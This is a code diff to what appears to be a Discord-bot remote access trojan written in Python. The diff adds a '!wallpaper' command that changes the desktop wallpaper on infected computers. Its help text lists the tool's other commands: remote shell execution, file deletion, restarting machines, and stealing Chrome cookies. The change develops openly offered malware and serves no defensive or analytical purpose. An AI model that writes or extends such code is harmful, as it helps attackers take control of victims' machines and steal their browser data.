@@ -17,6 +17,7 @@ from zipfile import ZipFile
 import random
 import shutil
 import pyperclip
+import ctypes
 
 while True:
     try:
@@ -412,6 +413,20 @@ while True:
                     await ctx.send(f"The remote system {sesja} is being restarted.")
         
         @bot.command()
+        async def wallpaper(ctx, session, *args):
+            if session == "all":
+                filePATH = " ".join(args)
+                filePATH = os.path.abspath(filePATH)
+                ctypes.windll.user32.SystemParametersInfoW(20, 0, filePATH , 0)
+                await ctx.send(f"wallpaper changed successfully")
+            else:
+                if session == sesja:
+                    filePATH = " ".join(args)
+                    filePATH = os.path.abspath(filePATH)
+                    ctypes.windll.user32.SystemParametersInfoW(20, 0, filePATH , 0)
+                    await ctx.send(f"wallpaper changed successfully")
+        
+        @bot.command()
         async def h(ctx):
             wiadomosc = '''
 !shell [session] [output(yes, no)] [command] - Executes a shell command on a remote computer.
@@ -438,6 +453,7 @@ while True:
 !restart [session] - Restart the remote computer.
 !chrome [session] [action(cookie)] - steals selected data from chrome
 !delete [session] [path] -  Deletes a file from the remote computer.
+!wallpaper [session] [path] -  changes the wallpaper on the remote computer.
             '''
             await ctx.send(wiadomosc)
 
